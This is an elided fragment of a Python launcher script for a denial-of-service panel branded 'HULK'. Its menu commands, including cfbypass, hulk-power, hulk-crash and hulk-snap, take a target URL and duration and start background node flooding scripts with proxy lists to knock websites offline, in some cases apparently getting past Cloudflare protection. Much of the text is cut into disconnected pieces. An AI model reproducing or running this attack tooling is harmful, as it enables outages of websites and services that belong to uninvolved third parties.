...
""")
                ...
                print("\033[36mExample Usage: raw https://example.com 60 10 ")
...
""")
                ...
                print("\033[36mExample Usage: storm https://example.com 60 10")
...
""")
                ...
                print("\033[36mExample Usage: proxy https://example.com 60 10")
                
        elif sinput == "cfbypass":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node hulk-destroy.js GET {target} proxy.txt {time} 512 {thread} 443 ')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
...
""")
                ...
                print("\033[36mExample Usage: cfbypass https://example.com 60 10")
#########LAYER-7########
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node hulk-power.js {target} {time} 512 10 proxy.txt ')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
...
""")
                ...
                print("\033[36mExample Usage: hulk-power https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: hulk-raw https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: hulk-flood https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: hulk-bypass https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: hulk-destroy https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: hulk-smash https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: hulk-burst https://example.com 120")
...
""")
                ...
                print("\033[36mExample Usage: slam-server https://example.com 120")

        elif sinput == "hulk-crash":
            try:
                host = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l12 && screen -dm node hulk-smash.js GET {host} proxy.txt {time} 512 10  ')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
...
""")
                ...
                print("\033[36mExample Usage: hulk-crash https://example.com 120")

        elif sinput == "hulk-snap":
            try:
                host = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l12 && screen -dm node hulk-burst.js GET {host} proxy.txt {time} 512 10  ')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
...
""")
                ...
                print("\033[36mExample Usage: hulk-snap https://example.com 120")
